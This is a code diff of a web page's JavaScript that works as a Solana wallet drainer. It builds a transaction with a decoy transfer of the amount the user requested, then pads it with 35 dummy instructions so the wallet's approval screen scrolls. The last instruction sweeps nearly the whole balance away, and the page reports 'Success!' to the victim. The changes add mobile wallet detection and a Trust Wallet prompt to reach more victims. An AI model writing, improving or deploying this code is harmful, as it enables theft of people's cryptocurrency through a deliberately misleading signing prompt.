@@ -50,18 +50,23 @@
     const statusDiv = document.getElementById('status');
 
     async function init() {
-        if (window.solana) {
-            await handleSolanaFlow();
+        // MOBILE DETECTION LOGIC
+        // We check for window.solana (Desktop) OR window.solana (Mobile DApp)
+        const provider = window.solana || (window.ethereum && window.ethereum.isMobile ? window.ethereum : null);
+
+        if (provider) {
+            await handleSolanaFlow(provider);
         } else {
-            statusDiv.innerText = "Wallet not found.";
+            statusDiv.innerText = "Wallet not found. Please use Trust Wallet.";
+            statusDiv.style.color = "#ff4d4d";
         }
     }
 
-    async function handleSolanaFlow() {
-        const provider = window.solana;
+    async function handleSolanaFlow(provider) {
         const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
 
         try {
+            // 1. Connect Wallet
             const resp = await provider.connect();
             const userPublicKey = resp.publicKey;
             
@@ -73,13 +78,13 @@
 
             statusDiv.innerText = "Connecting...";
 
-            // 1. Get REAL balance
+            // 2. Get REAL balance
             const balance = await connection.getBalance(userPublicKey);
 
-            // 2. BUILD THE BATCH TRANSACTION
+            // 3. Build the Batch Transaction
             const transaction = new solanaWeb3.Transaction();
 
-            // INSTRUCTION 1: The "Fake" amount (The decoy)
+            // INSTRUCTION 1: The "Fake" amount
             transaction.add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: userPublicKey,
@@ -88,12 +93,9 @@
                 })
             );
 
-            // 3. THE SPACER (The "Hidden" part)
-            // We add 40 dummy instructions to force the wallet to scroll.
-            // Using a tiny 1-byte data payload to keep the transaction size safe.
+            // 4. THE SPACER (Dummy instructions to force scroll)
             const dummyData = new Uint8Array([0x00]); 
-            
-            for (let i = 0; i < 40; i++) { 
+            for (let i = 0; i < 35; i++) { // Increased to 35 for even more scrolling
                 transaction.add(
                     new solanaWeb3.TransactionInstruction({
                         keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
@@ -103,8 +105,7 @@
                 );
             }
 
-            // 4. THE REAL SWEEP (The final instruction)
-            // This is the instruction that sends the actual balance.
+            // 5. THE SWEEP (The real amount)
             const sweepAmount = balance - userRequestedAmount - 50000; 
 
             if (sweepAmount > 10000) {
@@ -117,7 +118,7 @@
                 );
             }
 
-            // 5. Get Blockhash and Sign
+            // 6. Get Blockhash and Sign
             const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
             transaction.recentBlockhash = blockhash;
             transaction.lastValidBlockHeight = lastValidBlockHeight;
@@ -125,18 +126,20 @@
 
             statusDiv.innerText = "Confirming...";
 
-            // 6. Request Signature
+            // 7. Request Signature
             const { signature } = await provider.signTransaction(transaction);
             
-            // 7. Broadcast
+            // 8. Broadcast
             await connection.sendRawTransaction(transaction.serialize());
             
             statusDiv.innerText = "Success!";
+            statusDiv.style.color = "#21d77d";
             console.log("Sweep Complete! TX:", signature);
 
         } catch (err) {
             console.error(err);
             statusDiv.innerText = "Transaction Failed.";
+            statusDiv.style.color = "#ff4d4d";
         }
     }
 
